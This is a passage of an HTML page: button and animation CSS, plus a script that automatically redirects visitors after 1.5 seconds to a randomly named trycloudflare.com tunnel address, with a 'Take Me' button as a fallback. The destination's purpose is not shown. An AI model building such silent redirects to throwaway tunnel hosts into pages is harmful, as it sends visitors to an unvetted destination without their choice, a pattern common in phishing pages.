            animation-duration: 3s;
            animation-iteration-count: infinite;
            animation-timing-function: ease-in-out;
        }

        @keyframes spin {
            from {
                opacity: 0.0;
            }
            to {
                opacity: 0.6;
                transform: translate3d(-4px, -4px, 570px);
            }
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 10; /* Ensure button is on top of black background */
        }

        .button {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            padding: 25px 50px;
            font-size: 28px;
            color: white;
            text-decoration: none;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            transition: all 0.3s ease;
            cursor: pointer;
            font-weight: 600;
        }

        .button:hover {
            background: rgba(255, 255, 255, 0.2);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
        }

        #black {
            position: absolute;
            left: 10px;
            bottom: 10px;
            color: rgba(255,255,255,0.6);
            text-decoration: none;
            z-index: 20;
        }

        #black:after {
            content: 'Black & white';
        }

        #black:target {
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            background: #111;
            cursor: default;
        }

        #black:target:after {
            content: '';
        }

    <script>
        function redirect() {
            window.location.href = "https://population-reasons-reproductive-shelf.trycloudflare.com";
        }
        
        window.onload = function() {
            const wrapper = document.querySelector('.wrapper');
            const container = document.querySelector('.container');

            if (container) {
                container.style.display = 'none';
            }

            setTimeout(redirect, 1500);

            setTimeout(() => {
                if (wrapper) {
                    wrapper.style.display = 'none';
                }
                if (container) {
                    container.style.display = 'flex';
                }
            }, 5000);
        };
    </script>

    </div>
    <div class="container">
        <button class="button" onclick="redirect()">Take Me &rarr;</button>
